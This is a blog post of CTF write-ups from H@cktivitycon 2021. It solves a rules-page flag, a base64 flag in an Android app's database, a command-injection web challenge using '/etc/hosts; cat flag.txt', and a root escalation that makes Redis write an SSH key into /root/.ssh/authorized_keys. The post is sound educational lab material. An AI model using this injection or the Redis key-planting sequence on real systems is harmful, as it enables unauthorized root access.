---
layout: post
title: "H@cktivitycon Writeup: The Quick Ones"
image: ''
date:   2021-09-18 12:00:00
tags:
description: ''
categories:
- ctf
- h@cktivitycon
published: True
comments: false
---

![logo](https://an00brektn.github.io/img/Pasted image 20210918214829.png)

## Intro
I have devoted the past 48 hours to the **H@cktivitycon CTF**, run by [John Hammond](https://www.youtube.com/channel/UCVeW9qkBjo3zosnqUbG7CFw), [congon4tor](https://twitter.com/congon4tor?lang=en), [M_alpha](https://twitter.com/M_alphaaa), [fumenoid](https://twitter.com/fumenoid?lang=en), [NightWolf](https://twitter.com/nightwolf780), [Blacknote](https://twitter.com/BlacknoteSec), and [CalebStewart](https://twitter.com/calebjstewart), and boy howdy was it a great experience.  My team placed 128th out of ~1700 teams that actually scored, so we did not do that bad. The next few posts will be writeups associated with specific challenges/categories that I completed. This post, specifically, is dedicated to the challenges that were too short to be given their own post.

## Warmups: Read The Rules
### Description
`Please follow the rules for this CTF!`

### Solution
Very difficult, I know. Here's the rules page.
![asdf](https://an00brektn.github.io/img/Pasted image 20210918183345.png)

Hmm... no flag. Let's try looking at the source code with `CTRL+U`.
```html
[irrelevant html]
 <section class="content"> 
 <div class="col-md-6 offset-md-3"> 
 <p> We don't want to have to enforce restrictions on you, but there are a few things we would like to politely ask you not to do: </p> 
 <ol> 
 <li>Please do not attack the competition infrastructure or other players. The challenges are your targets. That's it.</li> 
 <li>You do not need to use automated scanners like <code>sqlmap</code>, DirBuster, <code>nmap</code>, Metasploit, <code>nikto</code> or others. Please do not use them against the challenges.</li> 
 <li>Please do not brute-force flags.</li> 
 <li>Please do not share flags with other players, or explicitly and deliberately cheat.</li> 
 <li><b><u>Please do not blatantly ask for hints.</u></b> The proper to way to ask for help is to explain what you have tried and showcase<i>(in a direct message)</i> what errors or output you may have.</li> </ol> <h2 class="mb-2"> Team Play</h2> 
 <p> This CTF is running in "team mode," as in, you can either create a team or join a team. Teams are strongly encouraged, and you may play solo, but you will still need to "create a team" and just be the only team member if you are playing alone. <b>There is no cap on number of players in a team.</b> </p> 
 <h2 class="mb-2"> Flag Format</h2> 
 <p>Flags for this competition will follow the format: <b><code>flag\{[0-9a-f]{32}\}</code></b>. That means a `flag{}` wrapper with what looks like an MD5 hash inside the curly braces. If you look closely, you can even find a flag on this page!</p> 
 <h2 class="mb-2"> Support</h2> 
 <p>For admin support in the case of any technical issues, please join the <code>Hacker101</code> Discord server: <a href="[https://discord.gg/efytpEAZwK](view-source:https://discord.gg/efytpEAZwK)">https://discord.gg/efytpEAZwK</a>.</p> 
 <p>You should find a <code>#ctf</code> channel in the <b>H@cktivityCon 2021</b> category and direct your questions there. When your question requires discussing a specific challenge, please direct message one of the challenge authors as noted in the challenge description. </p> 
 <h2 class="mb-2">Prizes</h2> 
 <p> We are pleased to offer prizes to the winners of the H@cktivityCon 2021 CTF! </p> 
 <ul> 
 <li> <b>1st Place</b> - $3,000 + HackerOne Swag </li> 
 <li> <b>2nd Place</b> - $1,500 + HackerOne Swag </li> 
 <li> <b>3rd Place</b> - $500 + HackerOne Swag </li> 
 </ul> 
 </div> 
 </section> 
 <!--     Thank you for reading the rules! Your flag is:         --> 
 <!--        flag{90bc54705794a62015369fd8e86e557b}              --> 
 <!-- You will have to wait until the CTF starts to submit this! -->
[irrelevant html]
```

An easy 50 points.

## Mobile: To Do
### Description
`I made my own app to remind me of all the things I need to do`

### Solution
I am by no means a mobile god. I've worked with Android Studio in the past, but all I did was write scripts because the app was developed for me, and I had no idea how the rest of it worked. However, with `strings` on our side, and an eye for what's not normal, we can get through this challenge with little to no mobile knowledge.

After downloading the apk, I'll run file to see what I can do with it.
```bash
kali@kali:~/ctf/hacktivitycon/todo$ file todo.apk
todo.apk: Zip archive data, at least v0.0 to extract
```

After running `unzip`, we're greeted with this mess.
```bash
kali@kali:~/ctf/hacktivitycon/todo$ tree
.
├── AndroidManifest.xml
├── assets
│   └── databases
│       └── todos.db
├── classes.dex
├── DebugProbesKt.bin
├── kotlin
│   ├── annotation
│   │   └── annotation.kotlin_builtins
│   ├── collections
│   │   └── collections.kotlin_builtins
│   ├── coroutines
│   │   └── coroutines.kotlin_builtins
│   ├── internal
│   │   └── internal.kotlin_builtins
│   ├── kotlin.kotlin_builtins
│   ├── ranges
│   │   └── ranges.kotlin_builtins
│   └── reflect
│       └── reflect.kotlin_builtins
├── META-INF
│   ├── [Metadata stuff]
│   ├── com
│   │   └── android
│   │       └── build
│   │           └── gradle
│   │               └── app-metadata.properties
│   ├── com.google.android.material_material.version
│   └── services
│       ├── kotlinx.coroutines.CoroutineExceptionHandler
│       └── kotlinx.coroutines.internal.MainDispatcherFactory
├── res
│   ├── [many, many png and xml files]
│   ├── color
│   │   ├── [xml files that do color stuff]
│   ├── color-night-v8
│   │   ├── material_timepicker_button_stroke.xml
│   │   ├── material_timepicker_clockface.xml
│   │   └── material_timepicker_modebutton_tint.xml
│   ├── color-v23
│   │   ├── abc_btn_colored_borderless_text_material.xml
│   │   ├── abc_btn_colored_text_material.xml
│   │   ├── abc_color_highlight_material.xml
│   │   ├── abc_tint_btn_checkable.xml
│   │   ├── abc_tint_default.xml
│   │   ├── abc_tint_edittext.xml
│   │   ├── abc_tint_seek_thumb.xml
│   │   ├── abc_tint_spinner.xml
│   │   └── abc_tint_switch_track.xml
│   ├── [many, many pngs and xml files]
├── resources.arsc
└── todo.apk
```

I've obviously cut some of this down because of how large it is, but you'll notice the `todos.db` file in assets. This is not in every application. Thankfully, it's in the SQLite format, so I can use `sqlitebrowser` to open it up. We find only two strings:
- `ZmxhZ3s1MjZlYWIwNGZmOWFhYjllYTEzODkwMzc4NmE5ODc4Yn0=`
- `VXNlIGFjdHVhbCBlbmNyeXB0aW9uIG5vdCBqdXN0IGJhc2U2NA==`

They're both in base64, so I can just run over to [CyberChef](https://gchq.github.io/CyberChef/) and decode the following messages.
- flag{526eab04ff9aab9ea138903786a9878b}
- Use actual encryption not just base64

Well, at least they're trying.

## Web: Confidentiality
### Description
`My school was trying to teach people about the CIA triad so they made all these dumb example applications... as if they know anything about information security. Can you prove these aren't so secure?`

### Solution
This is a web application, no downloadable source, but there is a deployable instance. Here's the main page.
![adsf](https://an00brektn.github.io/img/Pasted image 20210918184049.png)

Let's just try their example.
![asdf](https://an00brektn.github.io/img/Pasted image 20210918184130.png)

That looks like it literally came from `stdout` on the command line. Can we just construct a one-liner using a character like `;` or `&&`?
![asdf](https://an00brektn.github.io/img/Pasted image 20210918184244.png)

Yup. It's an easy challenge. We can read the flag using `/etc/hosts; cat flag.txt`.
![asdf](https://an00brektn.github.io/img/Pasted image 20210918184345.png)

## Misc: Redlike
### Description
`You know, I like the color red. Primary colors are the best colors -- you can do so much with them!  
Escalate your privileges and retrieve the flag out of root's home directory.`

### Solution
This was probably the hardest of these "quicker" challenges I solved. I'll start by SSH-ing into the box, and doing some initial enumeration.
```
user@redlike-32b0e986515748de-bd7ff4dff-2pgnp:~$ sudo -l
-bash: sudo: command not found
user@redlike-32b0e986515748de-bd7ff4dff-2pgnp:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/umount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
user@redlike-32b0e986515748de-bd7ff4dff-2pgnp:~$ ls -la
total 28
drwxr-xr-x 1 user user 4096 Sep 19 03:16 .
drwxr-xr-x 1 root root 4096 Sep 16 14:43 ..
-rw-r--r-- 1 user user  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 user user 3771 Feb 25  2020 .bashrc
drwx------ 2 user user 4096 Sep 19 03:16 .cache
-rw-r--r-- 1 user user  807 Feb 25  2020 .profile
user@redlike-32b0e986515748de-bd7ff4dff-2pgnp:~$ ls -la /opt
total 8
drwxr-xr-x 2 root root 4096 Aug 27 07:16 .
drwxr-xr-x 1 root root 4096 Sep 19 03:16 ..
user@redlike-32b0e986515748de-bd7ff4dff-2pgnp:~$ ls -la /tmp
total 8
drwxrwxrwt 1 root root 4096 Sep 16 14:44 .
drwxr-xr-x 1 root root 4096 Sep 19 03:16 ..
user@redlike-32b0e986515748de-bd7ff4dff-2pgnp:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
user:x:1000:1000::/home/user:/bin/bash
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
redis:x:106:107::/var/lib/redis:/usr/sbin/nologin
user@redlike-32b0e986515748de-bd7ff4dff-2pgnp:~$ cat /etc/crontab
cat: /etc/crontab: No such file or directory
user@redlike-32b0e986515748de-bd7ff4dff-2pgnp:~$ crontab -l
-bash: crontab: command not found
```

There are no quick and easy SUID/sudo privescs, nor are there cronjobs running. Now, confession, I was lazy and I ran [`linpeas.sh`](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), but you can also find this by running `ps aux`. Since we're in a container, it will have a smaller output.

```bash
user@redlike-32b0e986515748de-bd7ff4dff-2pgnp:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   3976  2904 ?        Ss   03:16   0:00 /bin/bash /.docker-entrypoint
root          15  0.1  0.0  47224  5116 ?        Ssl  03:16   0:00 /usr/bin/redis-server 127.0.0.1:6379
root          16  0.0  0.0  12176  7528 ?        S    03:16   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 sta
root          21  0.0  0.0  13388  8572 ?        Ss   03:16   0:00 sshd: user [priv]
user          32  0.0  0.0  13388  4760 ?        R    03:16   0:00 sshd: user@pts/0
user          33  0.0  0.0   5992  3908 pts/0    Ss   03:16   0:00 -bash
user          45  0.0  0.0   7648  3248 pts/0    R+   03:19   0:00 ps aux
```

### Research
That `redis-server` looks interesting. After doing some googling, we learn the following from the official [Redis](https://redis.io/topics/introduction) site.
> Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache, and message broker. Redis provides data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps, hyperloglogs, geospatial indexes, and streams.

Hmmm. I still don't fully understand what this means. My next idea was to visit [IppSec](https://ippsec.rocks) and see if there were any Redis related exploits from HackTheBox. Luckily, there is, from his video writeup of [Postman](https://www.youtube.com/watch?v=jJnHET1o8ZQ&t=655). Now, if you don't want to spoil that box for yourself, he finds this foothold from [HackTricks](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis).

### Grab the Flag
We find a lot of ways a misconfigured Redis environment can be leveraged to get command execution and/or privilege escalation. I originally tried dumping the database, but that didn't get me anywhere. However, one other route that sticks out at me is SSH. I'll let you read what HackTricks has to say, but the idea is in the `redis-cli`, you are the `redis` user. If `redis` has write permissions to another user's `authorized_keys` file, you can insert your own public key to ssh as a different user. 

A common misconfiguration across the board is giving service accounts more privilege than it needs. Surely `redis` is somehow able to write to the `root` directory? I'll follow the steps as is from HackTricks, with my own public key.

```bash
user@redlike-32b0e986515748de-bd7ff4dff-2pgnp:~$ (echo -e "\n\n"; echo "[public key cut out for space's sake]"; echo -e "\n\n") > spaced_key.txt
user@redlike-32b0e986515748de-bd7ff4dff-2pgnp:~$ cat spaced_key.txt | redis-cli -x set spaced_key.txt
OK
user@redlike-32b0e986515748de-bd7ff4dff-2pgnp:~$ redis-cli
127.0.0.1:6379> config set dir /root/.ssh
OK
127.0.0.1:6379> config set dbfilename "authorized_keys"
OK
127.0.0.1:6379> save
OK
127.0.0.1:6379> 
```

And in my own VM, I SSH as root to get the flag.
```bash
kali@kali:~/ctf/hacktivitycon/todo$ ssh -i ~/.ssh/id_rsa -p 31875 root@challenge.ctf.games

[trimmed welcome message]

root@redlike-32b0e986515748de-bd7ff4dff-2pgnp:~# whoami;id;hostname;pwd
root
uid=0(root) gid=0(root) groups=0(root)
redlike-32b0e986515748de-bd7ff4dff-2pgnp
/root
root@redlike-32b0e986515748de-bd7ff4dff-2pgnp:~# cat flag.txt
flag{69dc14707af23b728ebd1363715ec890}
```